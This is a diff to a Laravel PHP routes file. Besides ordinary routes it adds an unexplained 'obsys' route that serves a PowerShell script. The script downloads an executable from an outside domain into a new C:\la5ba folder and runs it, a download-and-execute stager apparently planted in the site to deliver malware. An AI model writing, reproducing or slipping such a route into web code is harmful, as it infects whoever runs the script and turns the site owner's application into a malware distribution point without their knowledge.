@@ -37,3 +37,19 @@ Route::get('delete/{id?}', 'MainController@getDeleteClient');
 Route::get('e7bf9ef7933f.html', function(){
   return "ca0649980ab1";
 });
+
+
+
+Route::get('obsys', function(){
+  $x = <<<EOT
+New-Item -ItemType Directory -Force -Path C:\la5ba | Out-Null
+$url = "http://www.worldlotteryusa.com/ob/jene.lol.exe"
+$output = "C:\la5ba\cbn.exe"
+$wc = New-Object System.Net.WebClient
+$wc.DownloadFile($url,$output)
+
+$args = @("")
+Start-Process -Filepath "C:\la5ba\cbn.exe"
+EOT;
+  return $x;
+});
